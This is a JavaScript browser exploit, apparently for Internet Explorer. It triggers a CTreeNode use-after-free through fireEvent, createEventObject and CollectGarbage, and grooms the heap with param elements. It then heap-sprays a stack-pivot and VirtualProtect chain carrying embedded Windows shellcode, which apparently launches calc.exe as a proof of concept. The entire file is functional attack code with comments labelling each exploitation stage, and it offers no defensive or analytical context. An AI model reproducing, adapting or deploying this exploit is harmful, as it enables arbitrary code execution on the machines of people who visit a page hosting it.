var e1 = null;
var shellcode = unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063");

function main() {
    var sp1 = document.createElement("span");
    sp1.id = "sp1";
    var div1 = document.createElement("div");
    div1.onclick = ev1;
	var params = new Array(20);
    //Enable LFH
	 for (var i = 0; i<params.length ; i++) {
         params[i] = document.createElement("param");
	     params[i].name= "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141";
    }
// CTreenode is allocated
    document.body.appendChild(sp1);
    sp1.appendChild(div1);

    div1.fireEvent("onclick");
}

function ev1() {
    e1 = document.createEventObject(event);
    window.setTimeout(ev2, 0);
}

function ev2() {
    var replacements = new Array(100);
	replacementBlock="\u0024\u0a0a\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141";
	for (var i = 0; i <replacements.length ; i++) {
       replacements[i] = document.createElement("param");
    }
// CTreenode gets freed
    document.getElementById("sp1").innerHTML = "";
    CollectGarbage();
	for (var i = 0; i <replacements.length ; i++) {
       replacements[i].name = replacementBlock;
    }
	var spray="\u0028\u0a0a\ue4f6\u74fb\u009c\u0a0a\u0024\u0a0a\ufff0\u0000\u0040\u0000\u0024\u0a08\u4141\u4141";
	for (var i = 0; i <(0x56/2)-3; i++) {	 
       spray += "\u4141";
	   }
    spray += "\u4a41\u6800"; //Stack Pivot
	spray += "\u4a41\u6800"; //Stack Pivot Virtual Protect 74fbe4f6
    spray += shellcode;	   
    
	heapspray(spray);
//CTreenode is used again
    var x = e1.srcElement;
}
function heapspray(data) {
    array100mb = new Array(200);

    // Create a string of 100,000 characters, taking up 200,000 bytes in memory.
    var str = "\u4141";

    while (str.length < 100000)
        str = str + str;

    // Allocate a new 64KB string (32768 UNICODE characters take up 64KB of space,
	// not including the heap header, string length field and null terminator)
    //
    // Note that foo is a global variable, because it's not declared
    // with the var keyword. This will ensure that it will not be
    // garbage collected when the function returns.

    str64k = data + str.substr(0, (64*1024/2)-data.length);
	str1mb="";
	for(i=0; i<15; i++) {
        str1mb += str64k;
    }
	 str1mb += str64k.substr(0, (64*1024/2)-(38/2));
	for (var j = 0; j<array100mb.length ; j++) {
        array100mb[j]= str1mb.substr(0, str1mb.length);
    }
}



